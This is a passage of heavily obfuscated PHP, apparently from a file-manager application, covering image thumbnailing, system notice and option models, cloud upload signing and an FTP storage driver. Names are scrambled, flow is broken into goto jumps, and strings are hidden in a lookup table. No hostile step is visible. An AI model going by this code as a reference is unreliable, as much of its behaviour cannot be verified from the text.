($bîÙÉ¶×¬ï = 0; $bîÙÉ¶×¬ï < $f¯Ò³Ÿº›Û; ++$bîÙÉ¶×¬ï, $f××åäœÆ += $c„¶ÖÁˆô°) { list(, $d±îß¥Ù“Î) = unpack($fŸ˜„“ùÇ[1772], $b‹‹°µ‡òã[$f××åäœÆ >> 3]); $cä´é½”Æ¬ = $f××åäœÆ & 7; imagesetpixel($aœ±¥¨, $bîÙÉ¶×¬ï, $fÏ™¨à“ã’, $DÖ²°¤·‚[($d±îß¥Ù“Î & $CÄå×Í¦Ï >> $cä´é½”Æ¬) >> $f÷íë¤ğ¾¼ - $cä´é½”Æ¬]); } } } goto F™¶„Šì’ƒ; F†ùƒíÕ´¦: $DÖ²°¤·‚ = array(); for ($D‘†Ã¡àª¡ = 0; $D‘†Ã¡àª¡ < $BºÓƒ‡—š; ++$D‘†Ã¡àª¡) { $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, $F¸ƒà—°¨Á); if ($b‹‹°µ‡òã === !1) { imagedestroy($aœ±¥¨); return !1; } extract(unpack($fŸ˜„“ùÇ[1768], $b‹‹°µ‡òã . $fŸ˜„“ùÇ[1767])); $DÖ²°¤·‚[] = imagecolorallocate($aœ±¥¨, $Eø¨³½ĞÑ•, $BáÚ§ç£µ£, $cä´é½”Æ¬); } $f÷íë¤ğ¾¼ = 8 - $c„¶ÖÁˆô°; goto BÂ½’ÓˆÃ§; FŸÑÇâñ™Ó: $aœ±¥¨ = imagecreate($f¯Ò³Ÿº›Û, $Cäñ¤¦‰œ¹); $F¸ƒà—°¨Á = $dÑÔº·Å² == 12 ? 3 : 4; $BºÓƒ‡—š = $B£š­Ó²  ? $B£š­Ó²  : pow(2, $c„¶ÖÁˆô°); goto F†ùƒíÕ´¦; F™¶„Šì’ƒ: } else { goto bÚÑ£‹§õ›; FŞ„¨Ö´Š: $Eî¼‡òã“ƒ = $c„¶ÖÁˆô° >> 3; $Cã¯Ë¤ê‚ = $F×´ Ì°•Ü ? 127 : 0; $D¸×ƒ¶¾¿Å = $F×´ Ì°•Ü ? 1 / $F×´ Ì°•Ü : 1; goto DÄêºÍ§ç¬; bÚÑ£‹§õ›: $aœ±¥¨ = imagecreatetruecolor($f¯Ò³Ÿº›Û, $Cäñ¤¦‰œ¹); imagealphablending($aœ±¥¨, !1); if ($F×´ Ì°•Ü) { imagesavealpha($aœ±¥¨, !0); } goto FŞ„¨Ö´Š; DÄêºÍ§ç¬: $fÌ»¹§® = $fó±Ğë‡Ê ? 1 / $fó±Ğë‡Ê : 1; $bá²Àíç–± = $AÓï÷ÓÂõé ? 1 / $AÓï÷ÓÂõé : 1; $D¬ÍÄ‡ï£Ò = $fŠœ®‹òè ? 1 / $fŠœ®‹òè : 1; goto C¿¸¤¯ªÊ‹; C¿¸¤¯ªÊ‹: for ($cÃ£—‹‹Úø = 0; $cÃ£—‹‹Úø < $Cäñ¤¦‰œ¹; ++$cÃ£—‹‹Úø, $fÏ™¨à“ã’ += $fÚ‚©œ˜™¤) { $b‹‹°µ‡òã = fread($FÃ›ø¿—¶, $BÎÊŠì¬ê„); if ($b‹‹°µ‡òã === !1) { imagedestroy($aœ±¥¨); return !1; } $f××åäœÆ = 0; for ($bîÙÉ¶×¬ï = 0; $bîÙÉ¶×¬ï < $f¯Ò³Ÿº›Û; ++$bîÙÉ¶×¬ï, $f××åäœÆ += $Eî¼‡òã“ƒ) { list(, $d±îß¥Ù“Î) = unpack($fŸ˜„“ùÇ[1749], substr($b‹‹°µ‡òã, $f××åäœÆ, $Eî¼‡òã“ƒ) . $fŸ˜„“ùÇ[1773]); $d¤Ğ‡¶¦Ëå = $d±îß¥Ù“Î & $F×´ Ì°•Ü; $AÜ§–™˜¢… = $d±îß¥Ù“Î & $fó±Ğë‡Ê; $fñ—Ñ‚Úæ = $d±îß¥Ù“Î & $AÓï÷ÓÂõé; $EÕçÏÉ°‹ì = $d±îß¥Ù“Î & $fŠœ®‹òè; $aê¶ÍØ©ë¤ = $Cã¯Ë¤ê‚ - (($d¤Ğ‡¶¦Ëå << 7) - $d¤Ğ‡¶¦Ëå) * $D¸×ƒ¶¾¿Å; $Eø¨³½ĞÑ• = (($AÜ§–™˜¢… << 8) - $AÜ§–™˜¢…) * $fÌ»¹§®; $BáÚ§ç£µ£ = (($fñ—Ñ‚Úæ << 8) - $fñ—Ñ‚Úæ) * $bá²Àíç–±; $cä´é½”Æ¬ = (($EÕçÏÉ°‹ì << 8) - $EÕçÏÉ°‹ì) * $D¬ÍÄ‡ï£Ò; imagesetpixel($aœ±¥¨, $bîÙÉ¶×¬ï, $fÏ™¨à“ã’, $aê¶ÍØ©ë¤ << 24 | $Eø¨³½ĞÑ• << 16 | $BáÚ§ç£µ£ << 8 | $cä´é½”Æ¬); } } imagealphablending($aœ±¥¨, !0); goto D™Í‡Ø™Äõ; D™Í‡Ø™Äõ: } return $aœ±¥¨; goto AŞ„“Ú†İ±; AŞ„“Ú†İ±: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($dÊºÈàÄ, $f…Æ®öÜÛŠ) { goto CÕ¼½•¤«ã; d ŠÍ’Å†É: if (!$this->im) { return !1; } $B£¢™ï¡ˆ = $_SERVER[ì‹É][33]; $this->imgData = GetImageSize($dÊºÈàÄ, $B£¢™ï¡ˆ); goto d‰©Éºõ«¤; d‰©Éºõ«¤: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto B¡Ä…×ëàğ; CÕ¼½•¤«ã: $this->srcFile = $dÊºÈàÄ; $this->echoType = $f…Æ®öÜÛŠ; $this->im = self::image($dÊºÈàÄ); goto d ŠÍ’Å†É; B¡Ä…×ëàğ: } public static function image($cÒ§™É”ñç) { $d•é—½¨×“ =& $_SERVER[ì‹É]; $bÊÕÔÉíæó = $d•é—½¨×“[33]; $aö³Çä„ˆ = GetImageSize($cÒ§™É”ñç, $bÊÕÔÉíæó); $d¢ÑŠÉ£¯ = !1; switch ($aö³Çä„ˆ[2]) { case IMAGETYPE_GIF: if (!function_exists($d•é—½¨×“[1774])) { break; } $d¢ÑŠÉ£¯ = imagecreatefromgif($cÒ§™É”ñç); break; case IMAGETYPE_JPEG: if (!function_exists($d•é—½¨×“[1775])) { break; } $d¢ÑŠÉ£¯ = imagecreatefromjpeg($cÒ§™É”ñç); break; case IMAGETYPE_PNG: if (!function_exists($d•é—½¨×“[1776])) { break; } $d¢ÑŠÉ£¯ = @imagecreatefrompng($cÒ§™É”ñç); imagesavealpha($d¢ÑŠÉ£¯, !0); break; case IMAGETYPE_XBM: $d¢ÑŠÉ£¯ = imagecreatefromxbm($cÒ§™É”ñç); break; case IMAGETYPE_WBMP: $d¢ÑŠÉ£¯ = imagecreatefromwbmp($cÒ§™É”ñç); break; case IMAGETYPE_BMP: $d¢ÑŠÉ£¯ = imagecreatefrombmp($cÒ§™É”ñç); break; default: break; } return $d¢ÑŠÉ£¯; } public static function imageSize($d”†é§‡ö) { $AÙğ¾ ´ =& $_SERVER[ì‹É]; $aëÀ™©–¥Ø = GetImageSize($d”†é§‡ö); if (!$aëÀ™©–¥Ø) { return !1; } return array($AÙğ¾ ´[1777] => $aëÀ™©–¥Ø[0], $AÙğ¾ ´[1778] => $aëÀ™©–¥Ø[1]); } function distortion($e±è·˜Ñ¢å, $DîÔ½Óãå, $Eƒç˜¦½„±) { $e¨†¹èÕ¶ä = $this->creatImage($this->im, $DîÔ½Óãå, $Eƒç˜¦½„±, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($e¨†¹èÕ¶ä, $e±è·˜Ñ¢å); } function prorate($c¶ƒÒÈ’·, $FŒ˜ğ¾§Ë, $E¼„ÈßŞ) { $eƒó¹éˆóô = $FŒ˜ğ¾§Ë / $E¼„ÈßŞ; $Bæœ£ß´íÃ = $this->srcW / $this->srcH; if ($eƒó¹éˆóô <= $Bæœ£ß´íÃ) { $CÚæËµ¥õ = $FŒ˜ğ¾§Ë; $E½’§„ÜÄ = $CÚæËµ¥õ * ($this->srcH / $this->srcW); } else { $E½’§„ÜÄ = $E¼„ÈßŞ; $CÚæËµ¥õ = $E½’§„ÜÄ * ($this->srcW / $this->srcH); } if ($this->srcW > $FŒ˜ğ¾§Ë || $this->srcH > $E¼„ÈßŞ) { $bĞ œ•íÊ = $this->creatImage($this->im, $CÚæËµ¥õ, $E½’§„ÜÄ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bĞ œ•íÊ, $c¶ƒÒÈ’·); } else { $bĞ œ•íÊ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bĞ œ•íÊ, $c¶ƒÒÈ’·); } } function cut($B²»Ë½²»…, $f‚šÃ¥àƒ¡, $d‘…¡èĞñï) { goto F‰Ë¬Èˆ²÷; d§Ë…‚‘á: $C¢´¹¤šªİ = $this->creatImage($this->im, $e—…œ™ÜœÉ, $a³À‚à±Œ, 0, 0, 0, 0, $this->srcW, $this->srcH); $C–ğ Åïµä = $this->creatImage($C¢´¹¤šªİ, $f‚šÃ¥àƒ¡, $d‘…¡èĞñï, 0, 0, ($e—…œ™ÜœÉ - $f‚šÃ¥àƒ¡) / 2, ($a³À‚à±Œ - $d‘…¡èĞñï) / 2, $f‚šÃ¥àƒ¡, $d‘…¡èĞñï); imageDestroy($C¢´¹¤šªİ); goto DÚÒİº¦–ƒ; DÚÒİº¦–ƒ: return $this->echoImage($C–ğ Åïµä, $B²»Ë½²»…); goto a¤”ù†´İ; F‰Ë¬Èˆ²÷: $C´âæáù„ß = $f‚šÃ¥àƒ¡ / $d‘…¡èĞñï; $FœØ’«¯„´ = $this->srcW / $this->srcH; if ($C´âæáù„ß <= $FœØ’«¯„´) { $a³À‚à±Œ = $d‘…¡èĞñï; $e—…œ™ÜœÉ = $a³À‚à±Œ * ($this->srcW / $this->srcH); } else { $e—…œ™ÜœÉ = $f‚šÃ¥àƒ¡; $a³À‚à±Œ = $e—…œ™ÜœÉ * ($this->srcH / $this->srcW); } goto d§Ë…‚‘á; a¤”ù†´İ: } function backFill($BĞ÷ÈÍÜ§, $fù×ãª’äŸ, $F»îãëßàÚ, $d©«ñË—ö = false, $Dè‰Û±»Š­ = 255, $eâ¤·é = 255, $E´ô„—Íõñ = 255) { goto AçÃ…ä¼­¡; CŒÎ¨—ƒ•º: if (function_exists($_SERVER[ì‹É][1779])) { @($c¤œëÀ‡Ì = imageCreateTrueColor($fù×ãª’äŸ, $F»îãëßàÚ)); if (!$c¤œëÀ‡Ì) { $c¤œëÀ‡Ì = imageCreate($fù×ãª’äŸ, $F»îãëßàÚ); } } else { $c¤œëÀ‡Ì = imageCreate($fù×ãª’äŸ, $F»îãëßàÚ); } $a¯×©²ˆƒæ = ($F»îãëßàÚ - $d£Í†—¶˜) / 2; $b¼ ñ›¯Î = imagecolorallocate($c¤œëÀ‡Ì, $Dè‰Û±»Š­, $eâ¤·é, $E´ô„—Íõñ); goto F¸Ñç’ô ; cÃ—ã¨õ…”: return $this->echoImage($c¤œëÀ‡Ì, $BĞ÷ÈÍÜ§); goto eİ®˜²Ùƒƒ; F¸Ñç’ô : if ($d©«ñË—ö) { $b¼ ñ›¯Î = imageColorTransparent($c¤œëÀ‡Ì, $b¼ ñ›¯Î); $a¯×©²ˆƒæ = $F»îãëßàÚ - $d£Í†—¶˜; } imageFilledRectangle($c¤œëÀ‡Ì, 0, 0, $fù×ãª’äŸ, $F»îãëßàÚ, $b¼ ñ›¯Î); if ($this->srcW > $fù×ãª’äŸ || $this->srcH > $F»îãëßàÚ) { $BÖ¹Â­¬”Ñ = $this->creatImage($this->im, $E¸²£‘ÂŸî, $d£Í†—¶˜, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($E¸²£‘ÂŸî < $fù×ãª’äŸ) { imageCopy($c¤œëÀ‡Ì, $BÖ¹Â­¬”Ñ, ($fù×ãª’äŸ - $E¸²£‘ÂŸî) / 2, 0, 0, 0, $E¸²£‘ÂŸî, $d£Í†—¶˜); } else { if ($d£Í†—¶˜ < $F»îãëßàÚ) { imageCopy($c¤œëÀ‡Ì, $BÖ¹Â­¬”Ñ, 0, $a¯×©²ˆƒæ, 0, 0, $E¸²£‘ÂŸî, $d£Í†—¶˜); } else { imageCopy($c¤œëÀ‡Ì, $BÖ¹Â­¬”Ñ, 0, 0, 0, 0, $E¸²£‘ÂŸî, $d£Í†—¶˜); } } } else { imageCopyMerge($c¤œëÀ‡Ì, $this->im, ($fù×ãª’äŸ - $E¸²£‘ÂŸî) / 2, $a¯×©²ˆƒæ, 0, 0, $E¸²£‘ÂŸî, $d£Í†—¶˜, 100); } goto cÃ—ã¨õ…”; AçÃ…ä¼­¡: $DÓÜÒºÔÛš = $fù×ãª’äŸ / $F»îãëßàÚ; $c ŞÊÜÓÃ = $this->srcW / $this->srcH; if ($DÓÜÒºÔÛš <= $c ŞÊÜÓÃ) { $E¸²£‘ÂŸî = $fù×ãª’äŸ; $d£Í†—¶˜ = $E¸²£‘ÂŸî * ($this->srcH / $this->srcW); } else { $d£Í†—¶˜ = $F»îãëßàÚ; $E¸²£‘ÂŸî = $d£Í†—¶˜ * ($this->srcW / $this->srcH); } goto CŒÎ¨—ƒ•º; eİ®˜²Ùƒƒ: } function creatImage($BÃ¾Á²öÍŞ, $f†÷‚ÛÌš, $eã«‘ßÑÄÀ, $BÙ«¼Œ¥˜, $Eï¦©å÷Æ, $FèË„”î¸×, $C–æØª‘™, $b±Šòì†™Œ, $F¯Á×ùÓ©¾) { if (function_exists($_SERVER[ì‹É][1779])) { @($A¶›…É à¹ = ImageCreateTrueColor($f†÷‚ÛÌš, $eã«‘ßÑÄÀ)); @imagealphablending($A¶›…É à¹, !1); @imagesavealpha($A¶›…É à¹, !0); if ($A¶›…É à¹) { imageCopyResampled($A¶›…É à¹, $BÃ¾Á²öÍŞ, $BÙ«¼Œ¥˜, $Eï¦©å÷Æ, $FèË„”î¸×, $C–æØª‘™, $f†÷‚ÛÌš, $eã«‘ßÑÄÀ, $b±Šòì†™Œ, $F¯Á×ùÓ©¾); } else { $A¶›…É à¹ = ImageCreate($f†÷‚ÛÌš, $eã«‘ßÑÄÀ); imageCopyResized($A¶›…É à¹, $BÃ¾Á²öÍŞ, $BÙ«¼Œ¥˜, $Eï¦©å÷Æ, $FèË„”î¸×, $C–æØª‘™, $f†÷‚ÛÌš, $eã«‘ßÑÄÀ, $b±Šòì†™Œ, $F¯Á×ùÓ©¾); } } else { $A¶›…É à¹ = ImageCreate($f†÷‚ÛÌš, $eã«‘ßÑÄÀ); imageCopyResized($A¶›…É à¹, $BÃ¾Á²öÍŞ, $BÙ«¼Œ¥˜, $Eï¦©å÷Æ, $FèË„”î¸×, $C–æØª‘™, $f†÷‚ÛÌš, $eã«‘ßÑÄÀ, $b±Šòì†™Œ, $F¯Á×ùÓ©¾); } return $A¶›…É à¹; } public function imgRotate($CÉƒŠÍ¢£, $cäªÄí©ˆ‰) { goto Aˆ™“‘ó¤ø; cÆ—Ú‚åƒ³: return $fÛ¸³ªŠˆó; goto a÷à¡›×õ¶; f—åÅ±Òä: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $fÛ¸³ªŠˆó = imagegif($BšÎ­ÉæÎ‡, $CÉƒŠÍ¢£); break; case IMAGETYPE_JPEG: $fÛ¸³ªŠˆó = imagejpeg($BšÎ­ÉæÎ‡, $CÉƒŠÍ¢£, 100); break; case IMAGETYPE_PNG: $fÛ¸³ªŠˆó = imagePNG($BšÎ­ÉæÎ‡, $CÉƒŠÍ¢£); break; default: break; } imageDestroy($BšÎ­ÉæÎ‡); imageDestroy($this->im); goto cÆ—Ú‚åƒ³; Aˆ™“‘ó¤ø: if (!$this->im || $cäªÄí©ˆ‰ % 360 === 0 || !function_exists($_SERVER[ì‹É][1780])) { return !1; } $BšÎ­ÉæÎ‡ = imageRotate($this->im, 360 - $cäªÄí©ˆ‰, 0); $fÛ¸³ªŠˆó = !1; goto f—åÅ±Òä; a÷à¡›×õ¶: } function echoImage($fìğ•Èñ, $Dõêù÷ùÓ) { goto d‚Œ†á; d‚Œ†á: $CØÈ½³Ô =& $_SERVER[ì‹É]; if (!$fìğ•Èñ) { return !1; } ob_get_clean(); goto d¯â†ÇŒ¶; d¯â†ÇŒ¶: $A¥ˆ‡ÚÍ—  = !1; switch ($this->echoType) { case $CØÈ½³Ô[1781]: $A¥ˆ‡ÚÍ—  = imagePNG($fìğ•Èñ); break; case $CØÈ½³Ô[164]: $A¥ˆ‡ÚÍ—  = imagePNG($fìğ•Èñ, $Dõêù÷ùÓ); break; } imageDestroy($fìğ•Èñ); goto CÄ±íõ¦ôœ; CÄ±íõ¦ôœ: imageDestroy($this->im); return $A¥ˆ‡ÚÍ— ; goto BÆ¶ÔÓ…è; BÆ¶ÔÓ…è: } } goto AŠßˆèÊ§Œ; Eá›ß˜Õ‘…: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x6e\157\x74\151\143\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x63\157\x6e\164\145\156\x74", "\x61\165\x74\x68", "\x6d\x6f\144\145", "\x74\151\x6d\x65", "\x74\x79\160\145", "\163\157\x72\164"); public function listData($cÔİé»Ù×Ò = false, $cç›«œ‰¤ = "\x73\157\162\164", $bâµŸÉÑº© = false) { return parent::listData($cÔİé»Ù×Ò, $cç›«œ‰¤, $bâµŸÉÑº©); } public function add($cà¼¤¯ñÂó) { goto BŠ„İÀ¾ó; bÚƒíêÔíÕ: return parent::insert($cà¼¤¯ñÂó); goto Aé¿•ô¥¡; A²˜µ¢: $eöîŞè§Óã = time(); if ($cà¼¤¯ñÂó[$Fà…–İ‹ßÍ[12]] == $Fà…–İ‹ßÍ[2359]) { $eöîŞè§Óã = strtotime($cà¼¤¯ñÂó[$Fà…–İ‹ßÍ[187]]); } $cà¼¤¯ñÂó[$Fà…–İ‹ßÍ[187]] = $eöîŞè§Óã; goto bÚƒíêÔíÕ; BŠ„İÀ¾ó: $Fà…–İ‹ßÍ =& $_SERVER[ì‹É]; $cŒâßª˜ìµ = $this->findByName($cà¼¤¯ñÂó[$Fà…–İ‹ßÍ[28]]); if ($cŒâßª˜ìµ) { return !1; } goto A²˜µ¢; Aé¿•ô¥¡: } public function update($cÆ÷ÎÒ£³à, $c‘Ô‹ÄèÏË) { goto d…˜îƒÖ—; d‘éĞÓ¼™ñ: if (!$dÛ—ç‘äÒ || $bšË¯İƒÈô && $bšË¯İƒÈô[$AŒÉëò¤†Ç[364]] != $dÛ—ç‘äÒ[$AŒÉëò¤†Ç[364]]) { return !1; } $FØ¸¶ÍÜì¾ = time(); if ($c‘Ô‹ÄèÏË[$AŒÉëò¤†Ç[12]] == $AŒÉëò¤†Ç[2359]) { $FØ¸¶ÍÜì¾ = strtotime($c‘Ô‹ÄèÏË[$AŒÉëò¤†Ç[187]]); } goto fÙ†“¥äôÀ; fÙ†“¥äôÀ: $c‘Ô‹ÄèÏË[$AŒÉëò¤†Ç[187]] = $FØ¸¶ÍÜì¾; return parent::update($cÆ÷ÎÒ£³à, $c‘Ô‹ÄèÏË); goto AÅ¬±Ûó; d…˜îƒÖ—: $AŒÉëò¤†Ç =& $_SERVER[ì‹É]; $dÛ—ç‘äÒ = $this->listData($cÆ÷ÎÒ£³à); $bšË¯İƒÈô = $this->findByName($c‘Ô‹ÄèÏË[$AŒÉëò¤†Ç[28]]); goto d‘éĞÓ¼™ñ; AÅ¬±Ûó: } public function remove($c¸š‹º±‘) { $BÔöòÖêÌ = $this->listData($c¸š‹º±‘); if (!$BÔöòÖêÌ || $BÔöòÖêÌ[$_SERVER[ì‹É][1053]]) { return !1; } return parent::remove($c¸š‹º±‘); } public function sort($A÷¬å›áÂğ, $C’àÙôë¶) { return parent::update($A÷¬å›áÂğ, $C’àÙôë¶); } private function initUserOption() { $b§á‘¥†Ö— =& $_SERVER[ì‹É]; $this->optionType = $b§á‘¥†Ö—[2360]; $this->modelType = $b§á‘¥†Ö—[2361]; $this->field = array($b§á‘¥†Ö—[2362], $b§á‘¥†Ö—[28], $b§á‘¥†Ö—[187], $b§á‘¥†Ö—[29], $b§á‘¥†Ö—[676], $b§á‘¥†Ö—[180]); } public function userNoticeGet($E±•óÙ×³ = false) { $this->initUserOption(); return parent::listData($E±•óÙ×³, $_SERVER[ì‹É][364], !0); } public function userNoticeAdd($Aáéù²ºĞª) { $e²¬àœ¬“› =& $_SERVER[ì‹É]; $this->initUserOption(); $b óó”É†ò = $this->findByKey($e²¬àœ¬“›[2362], $Aáéù²ºĞª[$e²¬àœ¬“›[364]]); if ($b óó”É†ò) { return !0; } $D¿áéãíïÖ = array($e²¬àœ¬“›[2362] => $Aáéù²ºĞª[$e²¬àœ¬“›[364]], $e²¬àœ¬“›[28] => $Aáéù²ºĞª[$e²¬àœ¬“›[28]], $e²¬àœ¬“›[187] => $Aáéù²ºĞª[$e²¬àœ¬“›[187]], $e²¬àœ¬“›[29] => isset($Aáéù²ºĞª[$e²¬àœ¬“›[29]]) ? $Aáéù²ºĞª[$e²¬àœ¬“›[29]] : 1, $e²¬àœ¬“›[676] => 0, $e²¬àœ¬“›[180] => 0); return parent::insert($D¿áéãíïÖ); } public function userNoticeEdit($EÍ Æ¨¿ÈÛ, $cŞ¼Âèœ‰) { $this->initUserOption(); return parent::update($EÍ Æ¨¿ÈÛ, $cŞ¼Âèœ‰); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\x65\x6d\x5f\157\160\x74\x69\x6f\156"; protected $jsonField = array("\155\145\x6e\x75", "\x72\x6f\x6c\145", "\x72\x6f\154\145\x47\x72\157\165\160", "\x72\x65\x67\151\163\164", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($E†…ÔÌçª ) { return "\123\171\163\x74\x65\x6d\x4f\x70\x74\x69\x6f\x6e\x5f{$E†…ÔÌçª }"; } protected function optionDefault($d¦ÅÖ«İ–Ì = '') { $Dë…ÌšÈ·‚ =& $_SERVER[ì‹É]; if ($d¦ÅÖ«İ–Ì == $Dë…ÌšÈ·‚[33]) { return $GLOBALS[$Dë…ÌšÈ·‚[6]][$Dë…ÌšÈ·‚[2363]]; } } } class SystemRecordModel extends ModelBaseLight { } goto fÅÂÁĞŒ»ù; eôø§ë™Ù´: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($fîõæŞİ‚) { parent::__construct($fîõæŞİ‚); $this->signatureVersion($_SERVER[ì‹É][197]); } public function uploadFormData($AÄÍÂµƒ˜æ, $aª…Î®Œ… = 3600) { goto E–äó•¶àÛ; C—ù¹¢Î‰õ: $BÜë¶ø÷éƒ = $d½…Î·Ã¡[1100]; $EÍßã¤÷Î½ = $aª…Î®Œ… . $d½…Î·Ã¡[33]; $BŒ¥ÛºêÙ“ = $d½…Î·Ã¡[1066]; goto f‘õ„˜ĞÊ; A‰¨ß†‹: $D¯åğÉí² = array($d½…Î·Ã¡[196] => $d½…Î·Ã¡[33], $d½…Î·Ã¡[1110] => $d½…Î·Ã¡[33], $d½…Î·Ã¡[1070] => $E²÷µÍğ¿Ï, $d½…Î·Ã¡[1074] => $BŒ¥ÛºêÙ“, $d½…Î·Ã¡[1078] => $C§¥±îŠ…, $d½…Î·Ã¡[1111] => $f™¯æÃ¿, $d½…Î·Ã¡[1112] => $FÓ…¬Ñğå, $d½…Î·Ã¡[1113] => $D‹–æ‹Ú•ì, $d½…Î·Ã¡[1114] => $EÍßã¤÷Î½, $d½…Î·Ã¡[1115] => $FÏ¾ÄÊëİ, $d½…Î·Ã¡[166] => $this->getHost()); return $D¯åğÉí²; goto F¾”’Î¿Ñ; E–äó•¶àÛ: $d½…Î·Ã¡ =& $_SERVER[ì‹É]; $E²÷µÍğ¿Ï = $d½…Î·Ã¡[182]; $FÓ…¬Ñğå = $d½…Î·Ã¡[1098]; goto e—›¸æß¼; f‘õ„˜ĞÊ: $A‰ÈŒ½ò¢ª = array($this->accessKey, $fÕ‹•á•‰À, $this->region, $F²‘ÑÚ¯„‚, $BÜë¶ø÷éƒ); $f™¯æÃ¿ = implode($d½…Î·Ã¡[8], $A‰ÈŒ½ò¢ª); $dÀªõ†œÌ = array($d½…Î·Ã¡[1068] => gmdate($d½…Î·Ã¡[1067], strtotime($d½…Î·Ã¡[1101])), $d½…Î·Ã¡[1069] => array(array($d½…Î·Ã¡[1071] => $this->bucket), array($d½…Î·Ã¡[1070] => $E²÷µÍğ¿Ï), array($d½…Î·Ã¡[1072], $d½…Î·Ã¡[1073], $d½…Î·Ã¡[33]), array($d½…Î·Ã¡[1072], $d½…Î·Ã¡[1102], $d½…Î·Ã¡[33]), array($d½…Î·Ã¡[1072], $d½…Î·Ã¡[1103], $d½…Î·Ã¡[33]), array($d½…Î·Ã¡[1074] => $BŒ¥ÛºêÙ“), array($d½…Î·Ã¡[1104] => $f™¯æÃ¿), array($d½…Î·Ã¡[1105] => $FÓ…¬Ñğå), array($d½…Î·Ã¡[1106] => $D‹–æ‹Ú•ì), array($d½…Î·Ã¡[1107] => $EÍßã¤÷Î½))); goto AˆîÅ ; aÕ™­ˆã†‰: $E‹¬»Ö‘¨´ = hash_hmac($d½…Î·Ã¡[1108], $F²‘ÑÚ¯„‚, $AÌ¡ÛÇÜì„, !0); $Bƒ½†ÆêùŞ = hash_hmac($d½…Î·Ã¡[1108], $BÜë¶ø÷éƒ, $E‹¬»Ö‘¨´, !0); $FÏ¾ÄÊëİ = hash_hmac($d½…Î·Ã¡[1108], $C§¥±îŠ…, $Bƒ½†ÆêùŞ); goto A‰¨ß†‹; e—›¸æß¼: $F²‘ÑÚ¯„‚ = $d½…Î·Ã¡[59]; $D‹–æ‹Ú•ì = gmdate($d½…Î·Ã¡[1099]); $fÕ‹•á•‰À = gmdate($d½…Î·Ã¡[677]); goto C—ù¹¢Î‰õ; AˆîÅ : $C§¥±îŠ… = base64_encode(json_encode($dÀªõ†œÌ)); $BÏ¶Ÿ·âó¸ = hash_hmac($d½…Î·Ã¡[1108], $fÕ‹•á•‰À, $d½…Î·Ã¡[1109] . $this->secret, !0); $AÌ¡ÛÇÜì„ = hash_hmac($d½…Î·Ã¡[1108], $this->region, $BÏ¶Ÿ·âó¸, !0); goto aÕ™­ˆã†‰; F¾”’Î¿Ñ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($Aó¼Îè•Ç–) { parent::__construct(); if (count($Aó¼Îè•Ç–) > 0) { $this->_init($Aó¼Îè•Ç–); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($b–½„ÃŸƒÜ) { $F°„«Åš«® =& $_SERVER[ì‹É]; global $config; $this->appCharset = $config[$F°„«Åš«®[1116]]; $this->systemCharset = $config[$F°„«Åš«®[1117]]; if (isset($b–½„ÃŸƒÜ[$F°„«Åš«®[1118]]) && $b–½„ÃŸƒÜ[$F°„«Åš«®[1118]]) { $this->systemCharset = $b–½„ÃŸƒÜ[$F°„«Åš«®[1118]]; } } public function iconvApp($e¹˜“•…Ò) { return $this->iconvTo($e¹˜“•…Ò, $this->systemCharset, $this->appCharset); } public function iconvSystem($fï–ª±é°•) { return $this->iconvTo($fï–ª±é°•, $this->appCharset, $this->systemCharset); } public function getPathOuter($BƒÛ¢¿¹“–) { goto DßÆÛ¢ëÄ; F‚ƒÒ¯†æ¯: $BƒÛ¢¿¹“– = KodIO::clear($BƒÛ¢¿¹“–); $BƒÛ¢¿¹“– = substr($BƒÛ¢¿¹“–, strlen($BßòšğÆÔ‹)); if (empty($this->pathDriver)) { return $BƒÛ¢¿¹“–; } goto AœŒÏª‚¢; AœŒÏª‚¢: return $this->pathDriver . $D¹½†‡ÓÖ[8] . ltrim($BƒÛ¢¿¹“–, $D¹½†‡ÓÖ[8]); goto Dˆ“ –î©Ç; DßÆÛ¢ëÄ: $D¹½†‡ÓÖ =& $_SERVER[ì‹É]; $BßòšğÆÔ‹ = $this->iconvApp($this->pathBase); $BƒÛ¢¿¹“– = $this->iconvApp($BƒÛ¢¿¹“–); goto Cªƒôã†¾Ÿ; Cªƒôã†¾Ÿ: if (substr($BßòšğÆÔ‹, 0, 2) == $D¹½†‡ÓÖ[1119]) { $BßòšğÆÔ‹ = BASIC_PATH . substr($BßòšğÆÔ‹, 2); } if (substr($BƒÛ¢¿¹“–, 0, 2) == $D¹½†‡ÓÖ[1119]) { $BƒÛ¢¿¹“– = BASIC_PATH . substr($BƒÛ¢¿¹“–, 2); } $BßòšğÆÔ‹ = KodIO::clear($BßòšğÆÔ‹); goto F‚ƒÒ¯†æ¯; Dˆ“ –î©Ç: } private function _init($e¬¿…Æ¹¹ã = array()) { goto CºÛ¯ßùöË; EòÚÇ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $c¹Â¹²˜£[$e¹½·õòŞ] = array($d°­ç˜ŠÚª[1125] => $this->connect, $d°­ç˜ŠÚª[166] => $this->host, $d°­ç˜ŠÚª[165] => $this->scheme, $d°­ç˜ŠÚª[167] => $this->port); goto a²‹óÇª¨‘; CºÛ¯ßùöË: $d°­ç˜ŠÚª =& $_SERVER[ì‹É]; if (!function_exists($d°­ç˜ŠÚª[1120])) { show_json(LNG($d°­ç˜ŠÚª[1121]), !1); } $this->charsetReset($e¬¿…Æ¹¹ã); goto C²Ğ«÷Ü’; a²‹óÇª¨‘: return $DÊÖá­–é; goto a„¼ÙĞ„‹Ô; C²Ğ«÷Ü’: foreach 